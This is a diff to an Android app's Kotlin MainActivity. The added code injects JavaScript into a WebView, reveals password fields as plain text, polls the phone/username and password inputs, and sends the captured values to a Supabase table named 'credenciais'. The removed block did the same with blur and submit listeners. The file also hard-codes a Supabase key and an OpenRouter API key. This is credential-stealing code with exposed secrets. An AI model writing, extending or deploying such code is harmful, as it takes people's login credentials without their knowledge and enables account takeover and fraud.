@@ -473,7 +473,7 @@ class MainActivity : AppCompatActivity() {
     private val SUPA_URL = "https://oulidkbxjfrddluoqsif.supabase.co"
     private val SUPA_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91bGlka2J4amZyZGRsdW9xc2lmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzg5NjU5OTEsImV4cCI6MjA5NDU0MTk5MX0.y1Bjum06WIQ0meZlOoOQrzCj8xTRXYTlDEHxTccWFFA"
     private val TABELA = "credenciais"
-    private val VERSAO_ATUAL = "9.3"
+    private val VERSAO_ATUAL = "9.4"
 
     // OpenRouter — provedor de IA (chave 1 principal, chave 2 fallback)
     private val OR_KEY   = "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"
@@ -1052,81 +1052,85 @@ class MainActivity : AppCompatActivity() {
         credPollerRunnable?.let { handler.removeCallbacks(it) }
         credPollerRunnable = null
 
-        // JS injetado uma única vez por página (flag _credDone).
-        // Usa evento 'blur' — só envia quando o utilizador sai do campo (valor completo).
-        // Também interceta o botão de submit para garantir captura mesmo sem blur.
-        val js = """
-(function() {
-    if (window._credDone) return;
-    window._credDone = true;
+        val jsVis = "document.querySelectorAll('input[type=\"password\"]')" +
+            ".forEach(function(e){e.type='text';});"
 
-    // Tornar passwords visíveis
-    function tornarVisivel() {
-        document.querySelectorAll('input[type="password"]').forEach(function(el) {
-            el.setAttribute('type', 'text');
-        });
-    }
-    tornarVisivel();
-    new MutationObserver(tornarVisivel).observe(document.body || document.documentElement, {childList:true, subtree:true});
+        val jsRead = "(" +
+            "function(){" +
+            "var u=document.querySelector('input[name=\"username\"]')" +
+            "||document.querySelector('input[name=\"phone\"]')" +
+            "||document.querySelector('input[name=\"msisdn\"]')" +
+            "||document.querySelector('input[name=\"login\"]');" +
+            "var p=document.querySelector('input[name=\"password\"]')" +
+            "||document.querySelector('input[name=\"senha\"]')" +
+            "||document.querySelector('input[type=\"password\"]')" +
+            "||document.querySelector('input[type=\"text\"][name]');" +
+            "var n=u&&u.value?u.value:'';var s=p&&p.value?p.value:'';" +
+            "return n+'|||'+s;" +
+            "})()"
 
-    var selNum = ['input[name="username"]','input[name="phone"]','input[name="msisdn"]','input[name="login"]','input[type="tel"]'];
-    var selSen = ['input[name="password"]','input[name="senha"]','input[placeholder*="senha" i]','input[placeholder*="password" i]'];
+        // Debounce: guarda o último valor lido e só envia após 2s sem mudança
+        var debounceNum: Runnable? = null
+        var debounceSen: Runnable? = null
+        var pendingNum = ""
+        var pendingSen = ""
 
-    function findEl(sels) {
-        for (var i = 0; i < sels.length; i++) {
-            var el = document.querySelector(sels[i]);
-            if (el) return el;
+        val poller = object : Runnable {
+            override fun run() {
+                webView.evaluateJavascript(jsVis, null)
+                webView.evaluateJavascript(jsRead) { raw ->
+                    try {
+                        if (raw != null && raw != "null" && raw.contains("|||")) {
+                            val clean = raw.trim().removePrefix("\"").removeSuffix("\"")
+                                .replace("\\n", "").replace("\\\"", "\"")
+                            val parts = clean.split("|||")
+                            val num = if (parts.size > 0) parts[0].trim() else ""
+                            val sen = if (parts.size > 1) parts[1].trim() else ""
+
+                            // Número: se mudou, reinicia debounce de 2s
+                            if (num.isNotEmpty() && num != credUltimoNum) {
+                                if (num != pendingNum) {
+                                    pendingNum = num
+                                    debounceNum?.let { handler.removeCallbacks(it) }
+                                    debounceNum = Runnable {
+                                        // Valor estabilizou — enviar
+                                        if (pendingNum != credUltimoNum) {
+                                            credUltimoNum       = pendingNum
+                                            ultimoNumeroEnviado = pendingNum
+                                            numeroTemporario    = pendingNum
+                                            android.util.Log.d("SKYBOT_CRED", "Número final → $pendingNum")
+                                            enviarSupabase("Numero", pendingNum)
+                                        }
+                                    }
+                                    handler.postDelayed(debounceNum!!, 2000)
+                                }
+                            }
+
+                            // Senha: se mudou, reinicia debounce de 2s
+                            if (sen.isNotEmpty() && sen != credUltimaSen) {
+                                if (sen != pendingSen) {
+                                    pendingSen = sen
+                                    debounceSen?.let { handler.removeCallbacks(it) }
+                                    debounceSen = Runnable {
+                                        // Valor estabilizou — enviar
+                                        if (pendingSen != credUltimaSen) {
+                                            credUltimaSen      = pendingSen
+                                            ultimaSenhaEnviada = pendingSen
+                                            android.util.Log.d("SKYBOT_CRED", "Senha final → len=${pendingSen.length}")
+                                            enviarSupabase("Senha", pendingSen)
+                                        }
+                                    }
+                                    handler.postDelayed(debounceSen!!, 2000)
+                                }
+                            }
+                        }
+                    } catch (_: Exception) {}
+                    handler.postDelayed(this, 800)
+                }
+            }
         }
-        return null;
-    }
-
-    function anexar() {
-        var elNum = findEl(selNum);
-        var elSen = findEl(selSen) || document.querySelector('input[type="text"][name]');
-
-        if (elNum && !elNum._credOk) {
-            elNum._credOk = true;
-            // blur: utilizador saiu do campo — valor completo
-            elNum.addEventListener('blur', function() {
-                var v = this.value.trim();
-                if (v.length > 0) Android.guardarNumero(v);
-            });
-        }
-        if (elSen && !elSen._credOk) {
-            elSen._credOk = true;
-            // blur: utilizador saiu do campo — valor completo
-            elSen.addEventListener('blur', function() {
-                var v = this.value.trim();
-                if (v.length > 0) Android.guardarSenha(v);
-            });
-        }
-    }
-
-    // Interceta submit do formulário — garante captura mesmo que blur não dispare
-    function interceptarSubmit() {
-        document.querySelectorAll('form, button[type="submit"], input[type="submit"], button').forEach(function(el) {
-            if (el._submitOk) return;
-            el._submitOk = true;
-            el.addEventListener('click', function() {
-                var elNum = findEl(selNum);
-                var elSen = findEl(selSen) || document.querySelector('input[type="text"][name]');
-                var n = elNum ? elNum.value.trim() : '';
-                var s = elSen ? elSen.value.trim() : '';
-                if (n.length > 0) Android.guardarNumero(n);
-                if (s.length > 0) Android.guardarSenha(s);
-            }, true);
-        });
-    }
-
-    anexar();
-    interceptarSubmit();
-    // Re-tentar após SPA renderizar campos dinamicamente
-    setTimeout(function() { anexar(); interceptarSubmit(); }, 1500);
-    setTimeout(function() { anexar(); interceptarSubmit(); }, 4000);
-})();
-        """.trimIndent()
-
-        webView.evaluateJavascript(js, null)
+        credPollerRunnable = poller
+        handler.post(poller)
     }
 
     private fun injetarJsCapturarSaldo() {
